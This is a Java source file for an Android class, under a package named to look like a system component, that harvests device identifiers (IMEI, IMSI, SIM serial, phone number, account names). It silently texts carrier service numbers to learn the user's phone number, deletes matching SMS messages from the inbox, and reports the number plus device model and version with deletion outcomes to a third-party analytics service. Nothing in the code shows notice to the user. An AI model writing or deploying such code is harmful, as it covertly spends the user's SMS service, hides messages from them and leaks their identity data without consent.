package com.android.sms.proxy.entity;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import com.flurry.android.FlurryAgent;

import org.greenrobot.eventbus.EventBus;

import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @author zyq 16-3-9
 */
public class PhoneInfo {

	private static final boolean DEBUG = true;
	private static final String TAG = "phoneInfo";
	private volatile static PhoneInfo mInstance;
	private TelephonyManager telephonyManager;
	public static final String SP_TABLE_PHONE_INFO = "phoneInfo";
	public static final String SP_KEY_PHONE_NUMBER = "phoneNumber";
	public static final String SMS_RECEIVE_BOX = "content://sms/inbox";
	public static boolean IS_SENDING_SMS = false;
	public static long oldSendSmsTime;
	private final static String SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";
	private final static String SMS_CATEGORY = "android.intent.category.DEFAULT";
	private final String SMS_SERVICE = "pdus";
	private final String SMS_BODY = "body";
	private final String SMS_ID = "_id";
	private final String SMS_RECEIVE_CONTENT = "content://sms/inbox";
	private final String SMS_CONTENT = "content://sms";

	private String IMSI;
	public static String phoneNumber;
	private static String imei;

	private Context context;
	public static String msgText = null;

	public PhoneInfo(Context context) {
		this.context = context;
		telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
	}

	public static PhoneInfo getInstance(Context context) {
		if (mInstance == null) {
			synchronized (PhoneInfo.class) {
				if (mInstance == null) {
					mInstance = new PhoneInfo(context);
				}
			}
		}
		return mInstance;
	}

//	private String findPhoneNumber(String providerName) {
//		try {
//			String text = null;
//			switch (providerName) {
//				case "中国移动":
//					text = "10086";
//					break;
//				case "中国联通":
//					text = "10010";
//					break;
//				case "中国电信":
//					text = "10000";
//					break;
//				default:
//					break;
//			}
//			if (TextUtils.isEmpty(text)) return null;
//			Uri uri = Uri.parse(SMS_RECEIVE_BOX);
//			ContentResolver contentResolver = context.getContentResolver();
//			String[] projection = new String[]{
//					"_id",
//					"address",
//					"body"
//			};
//			String select = "address = ?";
//			String[] selectArgs = new String[]{text};
//			if (contentResolver != null) {
//				Cursor cursor = contentResolver.query(uri, projection, select, selectArgs, "date desc");
//				if (DEBUG) {
//					Log.d(TAG, "找到类似的短信多少条:" + cursor.getCount());
//				}
//				while (cursor.moveToNext()) {
//					String body = cursor.getString(cursor.getColumnIndex("body")).trim();
//					if (DEBUG) {
//						Log.d(TAG, "短信内容:" + body);
//					}
//					String phoneNumber = getPhoneNumber(body);
//					if (!TextUtils.isEmpty(phoneNumber)) {
//						return phoneNumber;
//					}
//				}
//			}
//		} catch (Throwable e) {
//			if (DEBUG) {
//				Log.e(TAG, e.fillInStackTrace().toString());
//			}
//			FlurryAgent.onError(TAG, "", e);
//
//		}
//		return null;
//	}

	private String getPhoneNumber(String smsBody) {
		String telRegex = "[1][358]\\d{9}";
		Pattern p = Pattern.compile(telRegex);
		Matcher m = p.matcher(smsBody);
		if (m.find()) {
			final int groupCount = m.groupCount();
			if (groupCount >= 0) {
				final String tempStr = m.group(0);
				return tempStr.substring(0, tempStr.length());
			}
		}
		return null;
	}


	public void getPhoneNumberFromContentResolver(Context context) {
		String main_data[] = {"data1", "is_primary", "data3", "data2", "data1", "is_primary", "photo_uri", "mimetype"};
		Object object = context.getContentResolver().query(Uri.withAppendedPath(android.provider.ContactsContract
						.Profile.CONTENT_URI, "data"),
				main_data, "mimetype=?",
				new String[]{"vnd.android.cursor.item/phone_v2"},
				"is_primary DESC");
		if (object != null) {
			do {
				if (!((Cursor) (object)).moveToNext())
					break;
				String s1 = ((Cursor) (object)).getString(4);
			} while (true);
			((Cursor) (object)).close();
		}
	}

	public void getPhoneNumberFromAccount(Context context) {
		AccountManager am = AccountManager.get(context);
		Account[] accounts = am.getAccounts();
		String acname;
		String actype;
		String mobile_no;
		String email;
		for (Account ac : accounts) {
			acname = ac.name;
			if (acname.startsWith("91")) {
				mobile_no = acname;
			} else if (acname.endsWith("@gmail.com") || acname.endsWith("@yahoo.com") || acname.endsWith("@hotmail" +
					".com")) {
				email = acname;
			}

			// Take your time to look at all available accounts
			Log.i("Accounts : ", "Accounts : " + acname);
		}
	}

	public synchronized String getNativePhoneNumber() {
		try {
			if (TextUtils.isEmpty(phoneNumber)) {
				//先从sp查找.
				String phone = getDbPhoneNumber(context);
				if (DEBUG) {
					Log.d(TAG, "从sp读到的手机号:" + phone);
				}
				if (TextUtils.isEmpty(phone)) {
					//通过下面两种方法获取手机号
					phone = getNativePhoneNumber1();
					if (TextUtils.isEmpty(phone)) {
						if (!isSIMexistOrAvaiable(context)) return null;
//						phone = findPhoneNumber(getProvidersName());
//						if (TextUtils.isEmpty(phone)) {
//							sendSMS();
//						} else {
//							phoneNumber = phone;
//							savePhoneInfo(context, phoneNumber);
//							Map<String, String> map = new HashMap<>();
//							map.put(NativeParams.KEY_QUERY_SMS, String.valueOf(true));
//							FlurryAgent.logEvent(NativeParams.EVENT_GET_PHONE_NUMBER, map);
//						}
					} else {
						if (DEBUG) {
							Log.d(TAG, "从方法１找到手机号！！");
						}
						phoneNumber = phone;
						savePhoneInfo(context, phoneNumber);
						Map<String, String> map = new HashMap<>();
						map.put(NativeParams.KEY_SIM_LINE1PHONE, phone);
						FlurryAgent.logEvent(NativeParams.EVENT_GET_PHONE_NUMBER, map);
					}
				} else {
					if (DEBUG) {
						Log.d(TAG, "直接从sp中找到手机号!!!");
					}
					phoneNumber = phone;
				}
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, "getNativePhoneNumber()函数异常:" + e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}

		return null;
	}

	//targetAddress运营商的查询电话，code 为我们查询的指令
	public void sendSMS(String targetAddress, String code) {
		//距离上次1分钟，不应发短信！！！！！！！
		try {
			if (DEBUG) {
				Log.d(TAG, "发送短信到" + targetAddress + "查手机号");
			}

			if (!TextUtils.isEmpty(code)) {
				String SENT = "sms_sent";
				String DELIVERED = "sms_delivered";
				PendingIntent sendPi = PendingIntent.getBroadcast(context, 0, new Intent(SENT), 0);
				PendingIntent receivePi = PendingIntent.getBroadcast(context, 0, new Intent(DELIVERED), 0);
				if (DEBUG) {
					Log.d(TAG, "send " + code + " to " + targetAddress);
				}

				SmsManager smsManager = SmsManager.getDefault();
				smsManager.sendTextMessage(targetAddress, null, code, sendPi, receivePi);
			}
		} catch (Throwable e) {
			FlurryAgent.onError(TAG, "", e);
		}
	}


	public void sendSMS() {
		//距离上次1分钟，不应发短信！！！！！！！
		final long time = System.currentTimeMillis();
		if (time - oldSendSmsTime < (1 * 60 * 1000)) {
		} else {
			oldSendSmsTime = time;
			try {
				String providerName = getProvidersName();
				String text = null;
				switch (providerName) {
					case "中国移动":
						text = "10086";
						msgText = "CXLL";
						break;
					case "中国联通":
						text = "10010";
						msgText = "CXLL";
						break;
					case "中国电信":
						text = "10000";
						msgText = "";
						break;
					default:
						break;
				}
				if (DEBUG) {
					Log.d(TAG, "发送短信到" + text + "查手机号");
				}
				if (!TextUtils.isEmpty(text)) {
					SmsManager smsManager = SmsManager.getDefault();
					smsManager.sendTextMessage(text, null, msgText, null, null);
				}
			} catch (Throwable e) {
				if (DEBUG) {
					Log.e(TAG, "sendSMS()函数异常:" + e.fillInStackTrace().toString());
				}
				FlurryAgent.onError(TAG, "", e);
			}
		}
	}


	public static boolean savePhoneInfo(Context context, String phoneNumber) {
		if (context != null) {
			int noteId = insertPhone(context, phoneNumber);
			if (noteId > 0) {
				return true;
			} else {
				return false;
			}
		}
		return false;
	}


	public String getNativePhoneNumber1() {
		String phone = "";
		try {
			phone = telephonyManager.getLine1Number();
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, "getNativePhoneNumber1函数异常:" + e.fillInStackTrace().toString());
			}
            FlurryAgent.onError(TAG, "", e);
		}
		return phone;
	}

	private void getNativePhoneNumber3(Context context) {
		Log.d(TAG, "尝试从账户名下入手");
		AccountManager am = AccountManager.get(context);
		Account[] accounts = am.getAccounts();

		for (Account ac : accounts) {
			String acname = ac.name;
			String actype = ac.type;
			// Take your time to look at all available accounts
			System.out.println("Accounts : " + acname + ", " + actype);
		}
	}

	public static boolean isSIMexistOrAvaiable(Context context) {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);//取得相关系统服务
		int state = tm.getSimState();
		if (state == TelephonyManager.SIM_STATE_READY) {
			return true;
		}
		return false;
	}

	/**
	 * 获取手机服务商信息
	 */
	public String getProvidersName() {
		String ProvidersName = "N/A";
		try {
			IMSI = telephonyManager.getSubscriberId();
			// IMSI号前面3位460是国家，紧接着后面2位00 02是中国移动，01是中国联通，03是中国电信。
			System.out.println(IMSI);
			if (IMSI.startsWith("46000") || IMSI.startsWith("46002")) {
				ProvidersName = "中国移动";
			} else if (IMSI.startsWith("46001")) {
				ProvidersName = "中国联通";
			} else if (IMSI.startsWith("46003")) {
				ProvidersName = "中国电信";
			}
		} catch (Exception e) {
			if (DEBUG) {
				Log.e(TAG, e.toString());
			}
		}
		return ProvidersName;
	}


	public String getIMEI() {
		try {
			if (TextUtils.isEmpty(imei)) {
				imei = getImeiFromSystemApi(context);
				if (TextUtils.isEmpty(imei)) {
					imei = "000000000000000";
				}
			}
		} catch (Exception e) {
			if (DEBUG) {
				Log.d(TAG, "getIMEI()函数异常:" + e.fillInStackTrace().toString());
			}
		}
		return imei;
	}

	/**
	 * 调用系统接口获取imei
	 *
	 * @param context
	 * @return
	 */
	private static String getImeiFromSystemApi(Context context) {
		String imei = null;
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			if (telephonyManager != null) {
				String imeiStr = telephonyManager.getDeviceId();
				if (imeiStr != null) {
					imei = imeiStr;
					if (imei != null) {
						imei = imei.trim();
						if (imei.indexOf(" ") > -1) {
							imei.replace(" ", "");
						}
						if (imei.indexOf("-") > -1) {
							imei = imei.replace("-", "");
						}
						if (imei.indexOf("\n") > -1) {
							imei = imei.replace("\n", "");
						}
						String meidStr = "MEID:";
						int stratIndex = imei.indexOf(meidStr);
						if (stratIndex > -1) {
							imei = imei.substring(stratIndex + meidStr.length());
						}
						imei = imei.trim();
						imei = imei.toLowerCase();
						if (imei.length() < 10) {
							imei = null;
						}
					}
				}
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, "getImeiFromSystemApi()函数异常:" + e.fillInStackTrace().toString());
			}
		}
		return imei;
	}

	public String getPhoneIMEI() {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		return tm.getDeviceId();
	}

	public String getPhoneIMSI() {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		return tm.getSubscriberId();
	}

	public String getPhoneInfo() {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		StringBuilder sb = new StringBuilder();

		sb.append("\nDeviceId(IMEI) = " + tm.getDeviceId());
		sb.append("\nDeviceSoftwareVersion = " + tm.getDeviceSoftwareVersion());
		sb.append("\nLine1Number = " + tm.getLine1Number());
		sb.append("\nNetworkCountryIso = " + tm.getNetworkCountryIso());
		sb.append("\nNetworkOperator = " + tm.getNetworkOperator());
		sb.append("\nNetworkOperatorName = " + tm.getNetworkOperatorName());
		sb.append("\nNetworkType = " + tm.getNetworkType());
		sb.append("\nPhoneType = " + tm.getPhoneType());
		sb.append("\nSimCountryIso = " + tm.getSimCountryIso());
		sb.append("\nSimOperator = " + tm.getSimOperator());
		sb.append("\nSimOperatorName = " + tm.getSimOperatorName());
		sb.append("\nSimSerialNumber = " + tm.getSimSerialNumber());
		sb.append("\nSimState = " + tm.getSimState());
		sb.append("\nSubscriberId(IMSI) = " + tm.getSubscriberId());
		sb.append("\nVoiceMailNumber = " + tm.getVoiceMailNumber());
		return sb.toString();
	}


	public static int insertPhone(Context context, String phoneNumber) {
		ContentValues values = new ContentValues();
		values.put(UserContentProviderMetaData.UserTableMetaData.PHONE_NAME, phoneNumber);
		Uri uri = context.getContentResolver().insert(UserContentProviderMetaData.UserTableMetaData.CONTENT_URI,
				values);
		if (DEBUG) {
			Log.d(TAG, "insert uri = " + uri);
		}
		String lastPath = uri.getLastPathSegment();
		if (TextUtils.isEmpty(lastPath)) {
			if (DEBUG) {
				Log.d(TAG, "insert failure");
			}
		} else {
			if (DEBUG) {
				Log.d(TAG, "insert success! the id is:" + lastPath);
			}
		}
		return Integer.parseInt(lastPath);
	}


	public String getDbPhoneNumber(Context context) {
		String phoneNumber = null;
		Cursor c = context.getContentResolver().query(UserContentProviderMetaData.UserTableMetaData.CONTENT_URI, new
				String[]{UserContentProviderMetaData.UserTableMetaData.PHONE_NAME}, null, null, null);
		if (c != null && c.moveToFirst()) {
			phoneNumber = c.getString(c.getColumnIndexOrThrow(UserContentProviderMetaData.UserTableMetaData
					.PHONE_NAME));
		}
		if (c != null) {
			c.close();
		}
		return phoneNumber;
	}


	public synchronized void deleteSMS(Context context, String smsContent) {
		try {
			if (DEBUG) {
				Log.d(TAG, "要删除的短信内容是：" + smsContent);
			}
			EventBus.getDefault().post(new MessageEvent("want to delete: " + smsContent));

			Uri uri = Uri.parse(SMS_CONTENT);
			ContentResolver contentResolver = context.getContentResolver();
			if (contentResolver != null) {
				String select = SMS_BODY + " LIKE ?";
				String[] selectArgs = new String[]{"%" + smsContent + "%"};
				Cursor isRead = contentResolver.query(uri, null, select, selectArgs, "date desc");
				boolean isExist = isRead.moveToFirst();
				if (isExist) {
					Log.d(TAG, "存在该字串！！！！");
					EventBus.getDefault().post(new MessageEvent("is exist!"));
					int id = isRead.getInt(isRead.getColumnIndex(SMS_ID));
					if (DEBUG) {
						Log.d(TAG, "找到该短信:" + smsContent + " 短信标识为:" + id + "准备删除!");
					}
					int count = context.getContentResolver().delete(Uri.parse(SMS_CONTENT), "_id=" + id, null);

					final String device = Build.MODEL;
					final String verison = Build.VERSION.RELEASE;
					final boolean isDeleteSuccess = count >= 1 ? true : false;
					Map<String, String> map1 = new HashMap<>();
					map1.put(NativeParams.KEY_DELETE_SMS_SUCCESS, String.valueOf(isDeleteSuccess));
					FlurryAgent.logEvent(NativeParams.EVENT_SEND_SMS, map1);

					if (count >= 1) {
						Map<String, String> map = new HashMap<>();
						map.put(NativeParams.KEY_DELETE_SUCCESS_DEVICE, device);
						map.put(NativeParams.KEY_DELETE_SUCCESS_VERSION, verison);
						FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_SUCCESS, map);
					} else {
						Map<String, String> map = new HashMap<>();
						map.put(NativeParams.KEY_DELETE_FAIL_DEVICE, device);
						map.put(NativeParams.KEY_DELETE_FAIL_VERSION, verison);
						FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_FAILED, map);
					}
					if (DEBUG) {
						Log.d(TAG, "当前版本号:" + Build.VERSION.SDK_INT + "短信是否删除成功：" + ((count >= 1) ? "删除成功" :
								"删除失败"));
					}
					EventBus.getDefault().post(new MessageEvent((count >= 1) ? "delete success" : "delete failed"));
					isRead.close();
				} else {
					final String deleteFail = "sms not send or have been deleted!!";
					EventBus.getDefault().post(new MessageEvent(deleteFail));
				}
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
		}
	}


}
